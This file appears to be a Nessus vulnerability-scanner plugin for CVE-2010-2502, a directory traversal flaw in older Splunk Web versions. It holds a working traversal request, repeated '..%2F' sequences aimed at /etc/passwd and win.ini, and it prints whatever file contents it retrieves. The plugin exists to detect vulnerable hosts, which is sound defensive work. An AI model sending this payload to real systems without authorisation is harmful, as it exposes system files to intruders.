#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47621);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 23:21:21 $");

  script_cve_id("CVE-2010-2502");
  script_bugtraq_id(41269);
  script_osvdb_id(65931);

  script_name(english:"Splunk 4.0.x < 4.0.11 / 4.1.x < 4.1.2 Directory Traversal");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Splunk Web hosted on the remote web server is 4.0.x prior to
4.0.11 or 4.1.x prior to 4.1.2. It is, therefore, affected by a
directory traversal vulnerability due to a failure to properly
validate user-specified file names before returning the contents of
the file. A remote, unauthenticated attacker can exploit this, by
supplying directory traversal strings such as '..%2F' in a specially
crafted 'GET' request, to read arbitrary files from the remote system.

The installed version is also reportedly affected by several other
vulnerabilities, including a cross-site scripting vulnerability.
However, Nessus did not check for these additional vulnerabilities.");
  script_set_attribute(attribute:"see_also", value:"http://www.splunk.com/view/SP-CAAAFGD");
  script_set_attribute(attribute:"see_also", value:"http://www.splunk.com/base/Documentation/4.0.11/ReleaseNotes/4.0.11");
  script_set_attribute(attribute:"see_also", value:"http://www.splunk.com/base/Documentation/4.1.2/ReleaseNotes/4.1.2");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Splunk 4.0.11 / 4.1.2 or later. Alternatively, apply the
vendor's patch for issue SPL-31194.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/03"); # Advisory release date ??
  script_set_attribute(attribute:"patch_publication_date", value:"2010/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:splunk:splunk");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl","splunkd_detect.nasl","splunk_web_detect.nasl");
  script_require_ports("Services/www", 8089, 8000);
  script_require_keys("installed_sw/Splunk");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Splunk";

get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8000, embedded:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(qs:dir, port:port);
# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('/windows/win.ini', '/winnt/win.ini');
  else files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  url =  dir +
    "/en-US/static/app/gettingstarted/" +
    crap(data:"..%2F", length:5*10) +
    file ;

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

      report = '\n' +
        'Nessus was able to exploit the issue to retrieve the contents of\n'+
        "'" + file + "'"+' on the remote host by requesting the following\n'+
        "URL :" + '\n\n' +
        "  " +build_url(port:port,qs:url)+'\n';

      if (report_verbosity > 1)
      {
        report = report + '\n' +
          "Here are the contents : " + '\n\n' +
           crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
           res[2] + '\n' +
           crap(data:"-" , length:30) +  " snip " + crap(data:"-", length:30) + '\n' ;
       }
       security_hole(port:port, extra:report);
     }
     else security_hole(port);

     exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
